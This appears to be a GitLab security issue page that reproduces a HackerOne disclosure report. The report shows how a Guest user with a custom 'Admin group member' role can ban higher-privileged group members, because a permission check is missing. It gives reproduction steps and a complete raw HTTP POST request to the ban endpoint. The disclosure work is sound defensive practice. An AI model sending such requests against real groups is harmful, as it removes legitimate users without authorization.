=== Content from gitlab.com_a4846a67_20250110_194725.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Guest with custom role `Admin group member` can ban users

âš  **Please read [the process](https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md) on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.**

**[HackerOne report #2431597](https://hackerone.com/reports/2431597)** by `ashish_r_padelkar` on 2024-03-23, assigned to [@kmorrison1](/kmorrison1 "Kevin Morrison"):

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

##### Summary

Hello,

As per this document `https://docs.gitlab.com/ee/user/group/moderate_users.html#ban-a-user`, you need to have `owner` role to ban a user from group.

However, it is possible for `Guest` user with custom role permission `Admin group member` to ban any user from the group using this issue.

A Owner see the below option but `Guest` user with custom role permission `Admin group member` cant see the option in UI which is expected but using backend request , we can perform this action because of missing permission check on the request.

**Owner**

[![Screenshot_2024-03-23_at_11.18.31_AM.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/3a04616c4ad0b1920d9b8573c3eb909b1af72feb/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f35386363363336342d323065372d343134332d393435662d3332653731636239386364322f53637265656e73686f745f323032342d30332d32335f61745f31312e31382e33315f414d2e706e67)

\*\*`Guest` user with `Admin group member` \*\*

[![Screenshot_2024-03-23_at_11.18.22_AM.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/dbf2cba251204ebe1c428405ab2a77b4e6901693/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f37613435323638392d316630382d343764372d626161662d3732376564316166616531372f53637265656e73686f745f323032342d30332d32335f61745f31312e31382e32325f414d2e706e67)

##### Steps to reproduce

1.As a group owner , Go to `https://gitlab.com/groups/groupmarch2024/-/settings/roles_and_permissions` and create a custom role of `Guest` user with `Admin group member` permission. Lets name this as `GuestGroupAdmin`.

2.Now go to `https://gitlab.com/groups/groupmarch2024/-/group_members` and add 2 members. `UserA` with `GuestGroupAdmin` and `UserB` with `Maintainer` role.

3.Now as a group owner, you see the option to ban both these users.

4.Login as `UserA` and go to `https://gitlab.com/groups/groupmarch2024/-/group_members` . You wont see ban option for users which is expected and working as per documentation.

5.Now grab your `Cookie` and `authenticity_token` (you can also use `X-Csrf-Token` value in this) in below request.

```
POST /groups/groupmarch2024/-/group_members/98201602/ban HTTP/2
Host: gitlab.com
Cookie: <Replace_Your_Cookie_Here>
Content-Length: 117
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
Origin: https://gitlab.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://gitlab.com/groups/groupmarch2024/-/group_members
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8

authenticity_token=<Replace_Your_token_Here>&_method=put
```

Where `98201602` is the ID of `UserB` here. You can get this ID in HTML response of `https://gitlab.com/groups/groupmarch2024/-/group_members` (View Source and look for  `data-members-data`).

Send the request and you should see `UserB` is banned in group.

##### What is the current *bug* behavior?

Guest with `Admin group member` can ban user from the group that too for user having higher permissions.

##### What is the expected *correct* behavior?

Only group owner should be able to perform this as per documentation.

##### Output of checks

This bug happens on GitLab.com

Regards,

Ashish

#### Impact

Guest with custom role can ban users

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [Screenshot\_2024-03-23\_at\_11.18.22\_AM.png](https://h1.sec.gitlab.net/a/7a452689-1f08-47d7-baaf-727ed1afae17/Screenshot_2024-03-23_at_11.18.22_AM.png)
* [Screenshot\_2024-03-23\_at\_11.18.31\_AM.png](https://h1.sec.gitlab.net/a/58cc6364-20e7-4143-945f-32e71cb98cd2/Screenshot_2024-03-23_at_11.18.31_AM.png)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


